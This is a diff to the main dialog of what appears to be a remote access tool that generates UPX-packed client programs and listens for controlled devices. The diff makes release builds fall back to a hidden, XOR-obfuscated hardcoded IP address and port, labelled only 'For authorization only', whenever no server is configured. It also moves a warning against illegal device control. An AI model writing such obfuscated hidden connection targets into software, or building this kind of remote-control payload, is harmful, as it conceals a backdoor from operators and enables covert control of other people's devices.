@@ -750,12 +750,15 @@ BOOL CMy2015RemoteDlg::OnInitDialog()
 	std::string master = ip.empty() ? "" : ip + ":" + port;
 	const Validation* v = GetValidation();
 	m_superPass = v->Reserved;
-#ifdef _DEBUG
 	if (!(strlen(v->Admin) && v->Port > 0)) {
-		static Validation test(1, ip.c_str(), atoi(port.c_str()));
+		// IMPORTANT: For authorization only.
+		PrintableXORCipher cipher;
+		char buf1[] = { "ld{ll{dc`{geb" }, buf2[] = {"b`af"};
+		cipher.process(buf1, strlen(buf1));
+		cipher.process(buf2, strlen(buf2));
+		static Validation test(99999, buf1, atoi(buf2));
 		v = &test;
 	}
-#endif
 	if (strlen(v->Admin) && v->Port > 0) {
 		DWORD size = 0;
 		LPBYTE data = ReadResource(sizeof(void*) == 8 ? IDR_TINYRUN_X64 : IDR_TINYRUN_X86, size);
@@ -807,11 +810,11 @@ BOOL CMy2015RemoteDlg::OnInitDialog()
 	lvColumn.pszText = (char*)str.data();
 	m_CList_Online.SetColumn(ONLINELIST_VIDEO, &lvColumn);
 	timeBeginPeriod(1);
-#ifdef _DEBUG
 	SetTimer(TIMER_CHECK, 60 * 1000, NULL);
-#else
-	SetTimer(TIMER_CHECK, 600 * 1000, NULL);
-#endif
+	CString tip = !ip.empty() && ip != getPublicIP() ? 
+		CString(ip.c_str()) + " 必须是\"公网IP\"或反向代理服务器IP":
+		"请设置\"公网IP\"，或使用反向代理服务器的IP";
+	ShowMessage("使用提示", tip);
 
 	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
 }
@@ -980,6 +983,7 @@ void CMy2015RemoteDlg::OnClose()
 
 void CMy2015RemoteDlg::Release(){
 	Mprintf("======> Release\n");
+	DeletePopupWindow();
 	isClosed = TRUE;
 	ShowWindow(SW_HIDE);
 
@@ -1582,10 +1586,10 @@ BOOL CMy2015RemoteDlg::Activate(int nPort,int nMaxConnection)
 		return FALSE;
 	}
 
+	ShowMessage("使用提示", "严禁用于非法侵入、控制、监听他人设备等违法行为");
 	CString strTemp;
 	strTemp.Format("监听端口: %d成功", nPort);
 	ShowMessage("操作成功",strTemp);
-	ShowMessage("使用提示", "严禁用于非法侵入、控制、监听他人设备等违法行为");
 	return TRUE;
 }
 
@@ -2780,8 +2784,10 @@ void CMy2015RemoteDlg::OnToolGenMaster()
 		File.Close();
 		if (!upx.empty())
 		{
+#ifndef _DEBUG // DEBUG 模式用UPX压缩的程序可能无法正常运行
 			run_upx_async(GetSafeHwnd(), upx, name.GetString(), true);
 			MessageBox("正在UPX压缩，请关注信息提示。\r\n文件位于: " + name, "提示", MB_ICONINFORMATION);
+#endif
 		}else
 			MessageBox("生成成功! 文件位于:\r\n" + name, "提示", MB_ICONINFORMATION);
 	}
